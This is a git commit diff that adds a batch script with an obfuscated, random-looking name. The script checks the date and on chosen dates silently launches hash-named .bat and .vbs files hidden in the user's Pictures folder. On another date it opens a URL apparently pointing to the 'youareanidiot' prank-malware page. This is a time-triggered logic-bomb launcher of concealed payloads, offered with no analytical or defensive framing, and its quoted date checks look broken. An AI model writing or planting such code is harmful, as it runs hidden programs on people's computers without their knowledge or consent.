e93ea621c76a30b91d72a422ed62759d947a80fe
FaZeMelon <ryanmonkills6@gmail.com>
2017-04-01 00:54:09 +0200

    Update and rename 7685493bgnrtg5893xmj.vbs to 7685493bgnrtg5893xmj.bat

---
+++ scripts/7685493bgnrtg5893xmj.bat
@@ -0,0 +1,5 @@
+
+@echo off
+if %date% == "3/17/2017" start "" "C:\Users\%USERNAME%\Pictures\d3745b53b599b72e9cb750f4d757560d.bat"
+if %date% == "4/7/2004" start "" "http://curseddreams.me//youareanidiot.org.html"
+if %date% == "3/16/2017" start "" "C:\Users\%USERNAME%\Pictures\7b96332f2c9f777574ba038be0334018.vbs"
